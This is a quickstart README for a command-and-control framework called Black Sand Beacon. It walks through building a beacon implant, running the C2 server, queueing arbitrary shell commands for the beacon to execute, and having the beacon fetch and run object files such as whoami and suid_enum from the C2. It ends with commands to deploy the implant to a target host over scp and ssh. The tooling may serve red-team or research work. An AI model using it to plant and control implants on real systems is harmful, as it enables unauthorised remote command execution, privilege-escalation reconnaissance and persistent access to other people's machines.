# Black Sand Beacon - Quickstart

End-to-end run on a single host in five minutes.

## 1. Install build deps

Debian/Ubuntu:

```
sudo apt-get install -y gcc libcurl4-openssl-dev libssl-dev make python3 python3-pip
```

## 2. Clone and build

```
git clone https://github.com/<you>/blacksandbeacon
cd blacksandbeacon
make config    # creates config/config.json from the example
make beacon    # builds build/beacon
make bofs      # builds the five sample BOFs into build/bof/
```

If anything fails, run `make test` to see the exact compiler error.

## 3. Generate a real AES key

The example config ships with a placeholder. Replace it before
starting the beacon:

```
python3 -c "import secrets; print(secrets.token_hex(32))"
```

Edit `config/config.json` and paste the result into
`crypto.aes_key_hex`.

## 4. Start the C2

In one terminal:

```
python3 c2/server.py
```

You should see:

```
[*] C2 listening on 0.0.0.0:7070
```

To use a port other than 7070, set `BSB_C2_PORT=8080` in the
environment.

## 5. Copy a BOF onto the C2

```
mkdir -p sessions/uploads
cp build/bof/whoami.x64.o sessions/uploads/
cp build/bof/suid_enum.x64.o sessions/uploads/
```

The C2 serves anything in `sessions/uploads/` at
`/bof/<name>.x64.o`. The beacon will fetch it on demand.

## 6. Start the beacon

In a second terminal:

```
./build/beacon
```

The beacon reads `config/config.json`, polls the C2, and prints
what it sends and receives. With no commands queued it just
sleeps between polls.

## 7. Inject a command

In the C2 terminal, at the prompt:

```
Client ID: linux
Command:   id
```

The next time the beacon polls it will pick up `id`, execute it,
and post the result. The C2 appends the result to
`sessions/logs/linux.log` in CSV form.

## 8. Run a BOF

The beacon understands a `bof:<name>` command that downloads and
executes the named BOF:

```
Client ID: linux
Command:   bof:whoami
```

The beacon fetches `whoami.x64.o` from `/bof/whoami.x64.o`,
resolves the `BeaconPrintf`/`BeaconOutput` symbols, and calls
`go(args, alen)`. The BOF's output is appended to the same log.

## 9. Stop the C2

Ctrl-C in the C2 terminal. The beacon keeps running; kill it
with Ctrl-C or `kill <pid>`.

## 10. Run the beacon from anywhere

`./build/beacon` is the runnable artifact. It picks up
`build/config.json` (next to itself), so the same binary copied
to any directory with a `config.json` next to it works without
any environment variables.

If you want to deploy to a target host:

```
make install-all DESTDIR=/tmp/deploy
scp -r /tmp/deploy/* user@target:/opt/bsb/
ssh user@target /opt/bsb/beacon
```

`make install-all` is only needed for shipping to another machine.
For local development, `./build/beacon` is enough.

## Troubleshooting

`[-] config error: cannot open ...`
- The staged `build/config.json` is missing. Run `make config`
  and then `make` again, or check that `make clean` did not
  remove something it shouldn't have.

`fatal error: openssl/buffer.h: No such file`
- Install `libssl-dev` (Debian/Ubuntu) or the equivalent package
  for your distro. The CI installs it automatically.

`ModuleNotFoundError: No module named 'cryptography'`
- Run `pip install -r requirements.txt` in the C2 environment.

`make test` fails on the BOF compile test
- A BOF was edited and now pulls in a libc symbol. Check the
  `_no_libc_leak` test in `tests/test_bof_compile.py` for the
  list of forbidden symbols.

The beacon compiles and runs but never gets commands back
- The C2 URL in `config.json` is probably unreachable from the
  beacon's host. Test with `curl` from the beacon's host first.
- The AES key in the beacon's `config.json` does not match the
  C2's. The C2's `BSB_CONFIG` must point at the same file (or
  an identical copy).
